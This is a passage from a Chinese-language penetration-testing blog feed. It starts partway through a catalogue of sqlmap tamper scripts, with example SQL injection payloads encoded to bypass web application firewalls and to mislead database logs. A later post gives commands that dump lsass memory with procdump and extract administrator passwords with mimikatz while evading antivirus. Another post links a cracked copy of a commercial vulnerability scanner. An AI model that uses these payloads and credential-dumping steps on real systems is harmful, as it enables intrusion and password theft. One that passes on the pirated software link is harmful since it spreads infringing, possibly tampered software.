title="appendnullbyte.py"></a>appendnullbyte.py</h2><p>功能：在有效载荷结束位置加载零字节字符编码<br>平台：Microsoft Access<br>举例：1 AND 1=1 ==&gt; 1 AND 1=1%00</p><h2 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h2><p>功能：用base64格式进行编码<br>平台：All<br>举例：1’ AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</p><h2 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h2><p>功能：用between替换大于号（&gt;）<br>平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0<br>举例：<br>1 AND A &gt; B –  ==&gt; 1 AND A NOT BETWEEN 0 AND B  –<br>1 AND A = B –  ==&gt; 1 AND A BETWEEN B AND B –</p><h2 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h2><p>功能：对SQL语句替换空格字符为(%09)，并替换”=”—&gt;”LIKE”<br>平台：MySQL 5.1, SGOS<br>举例：SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1</p><h2 id="apostrophemask-py-1"><a href="#apostrophemask-py-1" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><p>功能：用utf-8格式编码引号(如：%EF%BC%87)<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><h2 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h2><p>功能：对字符串进行Unicode格式转义编码<br>平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET<br>举例：SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><h2 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h2><p>功能：采用url格式编码1次<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><h2 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h2><p>功能：采用url格式编码2次<br>平台：All<br>举例：SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><h2 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h2><p>功能：将payload中的逗号用 from和for代替，用于过滤了逗号并且是3个参数的情况<br>平台：MySQL 5.0, 5.5<br>举例：MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</p><h2 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h2><p>功能：CONCAT() ==&gt; CONCAT_WS()，用于过滤了CONCAT()函数的情况<br>平台： MySQL 5.0<br>举例：CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</p><h2 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h2><p>功能：= ==&gt; LIKE，用于过滤了等号”=”的情况<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5<br>举例：SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</p><h2 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h2><p>功能：&gt; ==&gt; GREATEST<br>平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：1 AND A &gt; B ==&gt; 1 AND GREATEST(A, B+1)=A<br>a和b+1比较，取两者中的最大值为a；则a &gt;= b+1，亦即a &gt; b</p><h2 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h2><p>功能：空格 ==&gt; /<em>!0 （在关键字前添加注释）<br>平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）<br>举例：union ==&gt; /</em>!0union</p><h2 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h2><p>功能：IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)<br>平台：MySQL 5.0 and 5.5<br>举例：IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</p><h2 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h2><p>功能：<br>在 information_schema 后面加上 /<strong>/ ，用于绕过对 information_schema 的情况<br>retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/</strong>/.”, payload)<br>平台：All<br>举例：select table_name from information_schema.tables ==&gt; select table_name from information_schema/**/.tables</p><h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>功能：将 payload 里的大写转为小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</p><h2 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h2><p>功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf<br>平台：MySQL 5.0<br>举例：1 AND 2&gt;1–  ==&gt; 1 /<em>!30874AND 2&gt;1</em>/–</p><h2 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h2><p>功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似<br>平台：Mysql<br>举例：1 and 2&gt;1–+ ==&gt; 1 /!00000and 2&gt;1/–+</p><h2 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h2><p>功能：围绕SQL关键字添加多个空格<br>平台：All<br>举例：1 UNION SELECT foobar ==&gt; 1   UNION   SELECT   foobar</p><h2 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h2><p>功能：关键字双写，可用于关键字过滤<br>平台：All<br>举例：1 UNION SELECT 2–  ==&gt; 1 UNIONUNION SELESELECTCT 2–</p><h2 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h2><p>功能： 转换给定的payload当中的所有字符<br>平台：All<br>举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</p><h2 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h2><p>功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个(%)<br>平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>举例：SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><h2 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h2><p>功能：将 payload 随机大小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：INSERT ==&gt; InseRt</p><h2 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h2><p>功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤<br>平台：Mysql<br>举例：INSERT ==&gt; I / ** / N / ** / SERT</p><h2 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h2><p>功能：在payload后追加特殊构造的字符串<br>平台：All<br>举例：1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</p><h2 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h2><p>功能：用注释符 // 代替空格，用于空格的绕过<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users ==&gt; SELECT//id//FROM//users</p><h2 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h2><p>功能：用[注释符(–)+一个随机字符串+一个换行符]替换控制符<br>平台：MSSQL、 SQLite<br>举例：union select 1,2–+ ==&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><h2 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h2><p>功能：用[注释符(#)+一个随机字符串+一个换行符]替换控制符<br>平台：Mysql<br>举例：union select 1,2–+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p><h2 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h2><p>功能：用多个[注释符(#)+一个随机字符串+一个换行符]替换控制符<br>平台：MySQL &gt;= 5.1.13<br>举例：union select 1,2–+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p><h2 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h2><p>功能：用随机的空白符替换payload中的空格<br>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>平台：Mssql 2000,2005<br>举例：SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</p><h2 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h2><p>功能：用[字符# +一个换行符]替换payload中的空格<br>平台：MSSQL、MySQL<br>举例：union select 1,2–+ ==&gt; union%23%0Aselect%23%0A1,2–+</p><h2 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h2><p>功能：用加号(+)替换空格<br>平台：All<br>举例：SELECT id FROM users ==&gt; SELECT+id+FROM+users</p><h2 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h2><p>功能：用随机的空白符替换payload中的空格<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</p><h2 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h2><p>功能：在payload语句后添加 sp_password ，用于迷惑数据库日志（Space ==&gt; sp_password）<br>平台：Mssql<br>举例：1 AND 9227=9227–  ==&gt; 1 AND 9227=9227 – sp_password</p><h2 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h2><p>功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况<br>平台：All<br>举例：<br>1 and 1=1 ==&gt; 1 %26%26 1=1<br>1 or 1=1 ==&gt; 1 %7c%7c 1=1</p><h2 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h2><p>功能：用 union select 替换union all select<br>平台：All<br>举例：union all select 1,2–+ ==&gt; union select 1,2–+</p><h2 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h2><p>功能：用宽字符绕过 GPC addslashes<br>平台：All<br>举例：1’ and 1=1 ==&gt; 1%df%27 and 1=1–</p><h2 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h2><p>功能：将payload中的小写字母转为大写格式<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：insert ==&gt; INSERT</p><h2 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h2><p>功能：添加一个HTTP头“ X-originating-IP ”来绕过WAF<br>平台：headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload<br>举例：All</p><h2 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h2><p>功能：对非函数的关键字进行注释<br>平台：MySQL 4.0.18, 5.1.56, 5.5.11<br>举例：1 union select user() ==&gt; 1/!UNION//!SELECT/user()</p><h2 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h2><p>功能：对每个关键字进行注释处理<br>平台：MySQL 5.1.56, 5.5.11<br>举例：1 union select user() ==&gt; 1/!UNION//!SELECT/user()</p><h2 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h2><p>功能：添加一个伪造的HTTP头“ X-Forwarded-For ”来绕过WAF<br>平台：All<br>举例：headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p><p>参考来源：<br>[1]SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips(<a href="https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3">https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3</a>)<br>[2]sqlmap的tamper详解(<a href="http://www.myh0st.cn/index.php/archives/881/">http://www.myh0st.cn/index.php/archives/881/</a>)<br>[3]sqlmap-tamper-scripts sqlmap tamper 详解(<a href="http://www.moonsec.com/post-422.html">http://www.moonsec.com/post-422.html</a>)<br>[4]Use SQLMAP To Bypass Cloudflare WAF And Hack Website With SQL Injection(<a href="https://www.sunnyhoi.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/">https://www.sunnyhoi.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/</a>)<br>[5]Understanding “tamper” option in Sqlmap (II)(<a href="http://0xd0m7.blogspot.com/2016/02/understanding-tamper-option-in-sqlmap-ii.html">http://0xd0m7.blogspot.com/2016/02/understanding-tamper-option-in-sqlmap-ii.html</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过杀软获取管理员密码姿势</title>
      <link href="2020/04/18/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
      <url>2020/04/18/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191424743.webp" alt="image"></p><pre><code>    可通利用procdump导出lsass进程数据获取lsass.exe进程中储存的名文密码</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191861031.webp" alt="image"></p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp  保存lsass数据为lsass.dmp</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191941306.webp" alt="image"></p><p>下载到本地使用mimikatz 进行解密获取名文密码</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonPasswords&quot;</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587192063514.webp" alt="image"></p><h3 id="注：08系统往前内存储存为名文-往后为哈希值需自行解密！！！"><a href="#注：08系统往前内存储存为名文-往后为哈希值需自行解密！！！" class="headerlink" title="注：08系统往前内存储存为名文 往后为哈希值需自行解密！！！"></a>注：08系统往前内存储存为名文 往后为哈希值需自行解密！！！</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 密码抓取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap高清思维导图</title>
      <link href="2020/04/07/sqlmaptu/"/>
      <url>2020/04/07/sqlmaptu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一张图概括  -6 -<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586260914723.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 思维导图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netsparker Enterprise Edition5.3 破解版</title>
      <link href="2020/04/07/Untitled/"/>
      <url>2020/04/07/Untitled/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586259981892.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586259981916.webp" alt="image"></p><p>下载地址:链接：<a href="https://pan.baidu.com/s/1SU0p3u-l1aOV0aAGJ_wuRg">https://pan.baidu.com/s/1SU0p3u-l1aOV0aAGJ_wuRg</a><br>                提取码：1qn8</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netsparker </tag>
            
            <tag> 破解软件 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> 软件下载 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
